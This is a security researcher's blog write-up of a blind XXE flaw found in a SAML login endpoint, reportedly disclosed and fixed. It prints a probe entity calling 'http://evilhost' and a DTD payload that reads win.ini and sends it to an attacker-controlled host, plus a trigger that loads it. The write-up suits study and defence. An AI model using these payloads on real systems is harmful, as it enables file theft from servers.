---
title: "Discovering a Blind XXE in an ICS Web App"
date: 2024-06-03
tags: ["vuln-research", "web-hacking", "bug-bounty"]
draft: false
---

# Public Security Research: XML External Entities Vulnerability Discovery

Recently, I did some public security research and discovered a critical security vulnerability in a login portal. The login portal was using SAML protocol for SSO authentication with a vulnerable XML parser in the backend. This allows for an attacker (or researcher like me) to exploit an XXE and perform sensitive file read on the server. In this writeup, I'll be discussing my methodology and how I discovered this vulnerability.

## The Target

When conducting security research on a web application target, recon and enumeration is one of the first and most important thing that you'll do. While I was fuzzing the main domain's directories and files, I came across an endpoint that was returning an HTTP 500 error called logout.aspx. This gave me several key information. I knew that the web server was running on windows and the application is running ASP.NET framework. 

When I'm on an endpoint, I like to use the features and functionality of the app to try to understand what the application is doing. This logout.aspx endpoint was returning an error with verbose error message in the response. When taking a look at the source code it seems like the endpoint was taking some parameters in a POST request when a user is logging on. Those two parameters with SAMLRequest and SAMLResponse. 

## The vulnerability

The SAMLResponse parameter when captured with a proxy had a base64 url encoded XML string to send via SAML in the backend for authentication purposes. If the backend XML parser is not properly sanitizing inputs or hardened then an attacker could manipulate the parameters with malicious XML.

I tested for this by encoding a basic XML payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>
```

When I sent that POST request, the server responsed saying that it could not resolve remote host named http://evilhost. This means that the XML parser is executing our code.

I modified the payload with my own web server and on my server log got a ping back from the vulnerable web server. At this point, I knew this portal was vulnerable to an XXE attack.

## Sensitive File Read

Now that I had identified a vulnerability, I wanted to demonstrate some impact. I was not able to read a file and have the contents returned to me in the server's response. This makes the XXE a blind XXE vulnerability. So, how can we escalate to achieve file read? 

### XXE OOB Exfiltration

One thing we can do is to perform an out of band data exfiltration. 

Out of band exfiltration is a technique where an attacker uses an external, often secondary channel to exfiltrate data. Instead of directly returning the data in the application's response (in band), the attacker causes the application to send the data to an external server they control. 

We can host an XML document that defines an external entity to retrieve the contents of a file and send it to our web server. In my case, I created a dtd file with the following payload:

```
<!ENTITY % file SYSTEM "file:///C:\windows\win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://IP:PORT/?data=%file;'>">
%eval;
%exfil;
```
Now, to trigger the vulnerability I will send in a POST request with the following payload url and base64 encoded:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % asd SYSTEM "http://IP:PORT/test.dtd">%asd;]><foo>&send;</foo>
```

In the first part, when we send this payload, the xml parser will process the payload to hit our dtd file. Then the xml parser will process the external dtd file that I created which will instruct it to fetch C:\windows\win.ini and send it back to my web server. The end result will have the file contents of the file encoded in our web server's log and we can easily decode to read the file contents.

![File Contents Retrieved](/images/xxe_results.png)

Thank you for reading this short writeup on discovering a Blind XXE on a public web application. I have reported this vulnerability to the proper authorities and they have now implemented security measures against this attack!
